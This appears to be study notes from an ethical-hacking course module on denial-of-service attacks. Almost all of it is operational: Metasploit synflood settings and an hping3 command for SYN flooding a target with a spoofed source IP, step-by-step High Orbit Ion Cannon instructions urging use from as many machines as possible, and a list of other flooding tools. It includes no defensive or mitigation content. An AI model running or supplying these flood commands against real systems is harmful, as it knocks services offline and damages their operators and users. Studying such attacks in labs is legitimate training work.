# Module 10 - Denial-of-Service #

## SYN Flooding a Target ##

### Metasploit ###
``` msfconsole ```

1. ``` use auxiliary/dos/tcp/synflood ```
2. ``` show options ```, ``` set RHOST <Target IP> ```, ``` set RPORT <Open Target Port - Ex. 21> ```, ``` set SHOST <Spoofed Source IP> ```, ``` set TIMEOUT <Seconds to wait for new data - Ex. 20000> ```
3. ``` exploit ```

### Hping3 ###
``` hping3 -S <Target IP> -a <Spoofed Source IP> -p <Target Port> --flood ``` - '-S' sets the TCP SYN flag 


- - - -

## Distributed Denial-of-Service Attack ##

### High Orbit Ion Cannon (HOIC) ###
1. Set the Target, set the Power bar to 'High', select the Booster 'GenericBoost.hoic', and click 'Add'
2. Set the nº of threads - Ex. 20
3. Do the same on as many machines as you can
4. 'Fire Teh Lazer!'


### Other DoS/DDoS Tools ###

#### Low Orbit Ion Cannon (LOIC) ####
#### HULK ####
#### R-U-Dead-Yet ####
#### Tsunami ####
#### Moihack Port-Flooder ####
